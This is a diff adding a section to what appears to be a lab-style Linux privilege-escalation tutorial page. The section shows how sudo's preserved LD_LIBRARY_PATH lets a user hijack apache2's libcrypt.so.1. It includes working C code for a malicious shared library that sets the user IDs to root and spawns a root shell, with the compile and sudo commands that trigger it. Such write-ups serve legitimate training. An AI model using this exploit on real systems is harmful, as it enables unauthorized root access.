@@ -227,13 +227,53 @@ void _init() {
                 <pre><code>user@debian:~$ sudo LD_PRELOAD=/tmp/naughty.so nano
 root@debian:/home/usr#</code></pre>
                 <p><strong>Congratulations, you own the system!</strong></p>
-            
-            
-            </section>
-
-
-
+                <p>For extra credit here, let's consider how we could still escalate our privileges if "LD_PRELOAD" was not effective, or it was restricted for some reason. </p>
+                <p><strong>Exploiting "LD_LIBRARY_PATH" to escalate privileges.</strong></p>
+                <p>We know already that both "LD_PRELOAD" and "LD_LIBRARY_PATH" are inherited from the user's environment. Previously, we explored how "LD_PRELOAD" can be exploited to escalate privileges to root. Here, we will demonstrate how "LD_LIBRARY_PATH" can be leveraged to achieve the same goal.</p>
+                <p>First, we confirm that <strong>apache2</strong> is installed and that our user has permission to run it as root without a password. Additionally, we check which environment variables are inherited when using "sudo":</p>
+                <pre><code>user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
                 
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/apache2</code></pre>
+                <p>From this output, we see that: the "LD_LIBRARY_PATH" environment variable is <strong>not reset</strong> when using "sudo", meaning we can manipulate it; our user can run "/usr/sbin/apache2" as root without requiring a password. This combination presents an opportunity for privilege escalation.</p>
+                <p>To determine which shared libraries "apache2" depends on, we use "ldd" (List Dynamic Dependencies) command:</p>
+                <pre><code>user@debian:~$ ldd /usr/sbin/apache2
+    linux-vdso.so.1 =>  (0x00007fff819ff000)
+	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f288296d000)
+	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f2882749000)
+	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f288250f000)
+	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f28822f3000)
+	libc.so.6 => /lib/libc.so.6 (0x00007f2881f87000)
+	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f2881d82000)
+	librt.so.1 => /lib/librt.so.1 (0x00007f2881b7a000)
+	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f2881943000)
+	libdl.so.2 => /lib/libdl.so.2 (0x00007f288173e000)
+	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f2881516000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f2882e2a000)</code></pre>
+                <p>When "apache2" runs, the dynamic linker (dynamic loader) will locate these shared object files and load them into memory. By default, the dynamic linker searches for shared object files in the system's standard library paths, such as "/usr/lib".</p>
+                <p>The key to this exploit is that if "LD_LIBRARY_PATH" is set, the dynamic linker prioritises directories in this variable over system defaults. This allows us to inject a malicious shared library by creating a malicious shared object with the same name as one of the libraries "apache2" depends on, e.g. "libcrypt.so.1". We then simply place the malicious file in a directory we control, e.g. "/tmp", and set the "LD_LIBRARY_PATH" to our custom directory before executing "apache2" via "sudo". Since "apache2" is running as root and is forced to load our malicious library first, we can execute arbitrary code as root.</p>
+                <p>Here is our malicious C code:</p>
+                <pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+                
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}</code></pre>
+                <p>Here we are declaring a function called "hijack()". The "__attribute__((constructor))" ensures this function runs automatically when the shared library is loaded. We then remove the "LD_LIBRARY_PATH" from the environment to avoid detection or interference with further library loading. "setresuid(0,0,0);" sets the real, effective, and saved user IDs to 0 (root), giving us root privileges. Finally, "system('/bin/bash -p');" spawns a root shell.</p>
+                <p>Complie and link the malicious C code to a shared object file, to a directory we control, here we use "/tmp":</p>
+                <pre><code>user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/library_path.c</code></pre>
+                <p>Finally, run "apache2" using "sudo", pointing the "LD_LIBRARY_PATH" to the directory containing our malicious version of the file named "libcrypt.so.1":</p>
+                <pre><code>user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
+root@debian:/home/user#</code></pre>
+                <p><strong>Congratulations, you own the system!</strong></p>
+            </section>
+    
         </article>
     </main>
 
